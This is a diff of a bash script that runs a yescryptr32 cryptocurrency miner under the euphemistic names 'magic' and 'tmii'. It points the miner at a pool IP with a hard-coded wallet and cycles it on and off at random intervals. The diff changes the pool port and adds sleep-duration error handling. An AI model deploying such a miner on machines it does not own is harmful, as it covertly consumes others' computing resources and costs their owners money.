@@ -24,7 +24,7 @@ start_magic() {
   local cores_to_use="0-$(($num_cores - 1))"  # Using the first $num_cores cores
 
   # Start the mining process with core affinity and output to log file
-  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.224.99:844 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
+  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.224.99:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
@@ -62,8 +62,13 @@ prepare_mining_script
 while true; do
   start_magic
   local sleep_duration=$(get_random_sleep_duration)  # Get a random sleep duration
-  echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
-  sleep $sleep_duration  # Wait for a random time between 2 and 7 minutes
+  if [[ -z "$sleep_duration" || "$sleep_duration" -le 0 ]]; then
+    echo "Error: Invalid sleep duration: $sleep_duration"
+    sleep 120  # Default sleep time in case of an error
+  else
+    echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
+    sleep $sleep_duration  # Wait for a random time between 2 and 7 minutes
+  fi
   stop_magic
   sleep 120  # Wait for 2 minutes
 done
